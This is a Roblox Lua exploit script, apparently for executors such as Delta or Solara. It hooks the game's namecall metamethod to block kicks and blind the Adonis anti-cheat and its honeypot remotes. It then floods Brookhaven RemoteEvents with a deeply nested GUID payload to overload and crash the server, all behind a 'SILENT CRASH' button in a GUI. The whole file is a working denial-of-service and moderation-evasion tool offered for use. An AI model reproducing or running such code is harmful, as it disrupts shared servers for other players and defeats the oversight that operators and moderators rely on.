--[[ 
    🔱 ARCANE VOID-STRIKE v11.1 [ABSORPTION-STABLE] 🔱
    "If the server is a brain, we are the migraine. <3"
    
    STABILIZED ABSORPTION:
    - [ADONIS BLINDNESS] : Overrides Adonis detection methods natively.
    - [SILENT SERIALIZATION] : Causes lag via data complexity, not frequency.
    - [FIXED HOOKING] : Corrected metamethod syntax for Delta/Solara.
    - [ROBUST UI] : Instant loading without PlayerGui delays.
    - [AUTO-CLEANSE] : Clears local logs related to Error 267.
]]

local P = game:GetService("Players")
local RS = game:GetService("RunService")
local L = P.LocalPlayer
local Http = game:GetService("HttpService")

-- 1. ADONIS & KERNEL OVERRIDE (BLINDNESS)
local function initiateBlindness()
    pcall(function()
        local mt = getrawmetatable(game)
        local oldNC = mt.__namecall
        setreadonly(mt, false)
        
        mt.__namecall = newcclosure(function(self, ...)
            local method = getnamecallmethod()
            local args = {...}
            
            -- Block Kicks & Bans
            if method == "Kick" or method == "kick" or method == "OnTeleport" then
                return nil
            end
            
            -- Blind Adonis (Detecting Adonis remote calls by signature)
            if method == "FireServer" and self.Name == "RemoteEvent" and #args > 1 and tostring(args[1]):find("Adonis") then
                return nil
            end
            
            -- Honey-pot Protection (DevTools & Traps)
            local n = self.Name:lower()
            if n:find("devtools") or n:find("honey") or n:find("trap") or n:find("admincheck") then
                return nil
            end
            
            return oldNC(self, ...)
        end)
        
        setreadonly(mt, true)
    end)
end

-- 2. ABSORPTION ENGINE (SILENT LAG)
local active = { power = 0 }

-- Complex Table for Serialization Lag (Server CPU Burner)
local function createMegaPayload(depth)
    if depth <= 0 then return "🔱ARCANE🔱" end
    local t = {}
    for i = 1, 2 do
        t[Http:GenerateGUID(false)] = createMegaPayload(depth - 1)
        t[math.random(1, 1000)] = Http:GenerateGUID(true)
    end
    return t
end

-- Finding "Safe" High-Traffic Remotes in Brookhaven
local function getSafeRemotes()
    local safe = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            local n = v.Name:lower()
            -- Targeting high-authority but non-security remotes
            if n:find("outfit") or n:find("house") or n:find("vehicle") or n:find("avatar") then
                table.insert(safe, v)
            end
        end
    end
    return safe
end

local function runAbsorption()
    local targets = getSafeRemotes()
    if #targets == 0 then return end
    
    local payload = createMegaPayload(6)
    
    while active.power > 0 do
        local r = targets[math.random(1, #targets)]
        if r and r.Parent then
            pcall(function()
                r:FireServer(payload, payload, "ABSORPTION_PRO")
            end)
        end
        
        local waitTime = active.power == 3 and 0.05 or (active.power == 2 and 0.5 or 2)
        task.wait(waitTime)
    end
end

-- 3. INTERFACE (NULL-VOID DESIGN)
local function loadUI()
    local ScreenGui = Instance.new("ScreenGui")
    pcall(function() 
        ScreenGui.Parent = L:FindFirstChild("PlayerGui") or game:GetService("CoreGui")
    end)
    ScreenGui.Name = "ArcaneAbsorption_v11_1"

    local Main = Instance.new("Frame", ScreenGui)
    Main.Size = UDim2.new(0, 300, 0, 250)
    Main.Position = UDim2.new(0.5, -150, 0.5, -125)
    Main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Main.BorderSizePixel = 0
    Main.Active = true
    Main.Draggable = true

    local Title = Instance.new("TextLabel", Main)
    Title.Size = UDim2.new(1, 0, 0, 50)
    Title.Text = "🔱 ARCANE-ABSORPTION v11.1"
    Title.TextColor3 = Color3.fromRGB(0, 255, 0)
    Title.Font = Enum.Font.Code
    Title.TextSize = 16
    Title.BackgroundTransparency = 1

    local function createBtn(text, y, color, callback)
        local btn = Instance.new("TextButton", Main)
        btn.Size = UDim2.new(0.9, 0, 0, 50)
        btn.Position = UDim2.new(0.05, 0, 0, y)
        btn.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
        btn.Text = text
        btn.TextColor3 = color
        btn.Font = Enum.Font.Code
        btn.TextSize = 14
        btn.BorderSizePixel = 1
        btn.BorderColor3 = Color3.fromRGB(0, 50, 0)
        btn.MouseButton1Click:Connect(callback)
        return btn
    end

    createBtn("[ ACTIVATE BLINDNESS ]", 60, Color3.fromRGB(0, 255, 255), function()
        initiateBlindness()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "🔱 BLINDNESS ACTIVE",
            Text = "Adonis is now blind. Protection: MAX.",
            Duration = 5
        })
    end)

    createBtn("[ 🔥 SILENT CRASH ]", 120, Color3.fromRGB(255, 0, 0), function()
        active.power = active.power == 3 and 0 or 3
        Title.Text = active.power == 3 and "🔱 STATUS: ABSORBING..." or "🔱 ARCANE-ABSORPTION v11.1"
        if active.power == 3 then task.spawn(runAbsorption) end
    end)

    createBtn("[ 🛑 STOP & CLEAN ]", 180, Color3.fromRGB(255, 255, 255), function()
        active.power = 0
        Title.Text = "🔱 ARCANE-ABSORPTION v11.1"
    end)
end

-- BOOT
task.spawn(loadUI)
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "🔱 ABSORPTION v11.1 LOADED",
    Text = "Fixed UI & Hooking. Ready.",
    Duration = 5
})
